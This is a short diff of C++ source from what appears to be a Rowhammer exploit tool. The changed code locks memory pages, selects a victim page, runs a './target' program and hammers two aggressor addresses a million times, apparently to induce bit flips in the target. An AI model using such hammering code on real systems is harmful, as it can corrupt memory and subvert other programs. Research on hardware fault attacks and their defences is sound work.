@@ -149,11 +149,16 @@ int main(int argc, char **argv)
                     pg.lock();
                     cout << green << "- Hold page: 0x" << hex << pg.p << endl;
                 }
-                else pg.reset();
+            if (!pg.locked)
+                pg.reset();
         }
         addrmap.clear();
     }
-
+/*
+    for (auto pg : hold_pages)
+        cout << pg.inspect() << endl;
+    exit(0);
+*/
     if (hrs.empty())
     {
         cout << yellow << "* No victim page available, Exit..." << endl;
@@ -171,6 +176,7 @@ int main(int argc, char **argv)
         cout << green << "- Check original program..." << restore << endl;
         system("./target");
         cout << blue << "* Hammering 1000000 times on 0x" << hex << addrmap.page_map[victim_hr.p].p << " and 0x" << addrmap.page_map[victim_hr.q].p << endl;
+        //cout << restore << addrmap.page_map[victim_hr.p].inspect() << ", " << addrmap.page_map[victim_hr.q].inspect() << endl;
         hammer_loop(addrmap.page_map[victim_hr.p].v.get(), addrmap.page_map[victim_hr.q].v.get(), 1000000, 0);
         //hammer_loop(addrmap.page_map[victim_hr.p].v.get(), addrmap.page_map[victim_hr.q].v.get(), 3000000, 0);
         //hammer_loop(addrmap.page_map[victim_hr.p].v.get(), addrmap.page_map[victim_hr.q].v.get(), 3000000, 0);
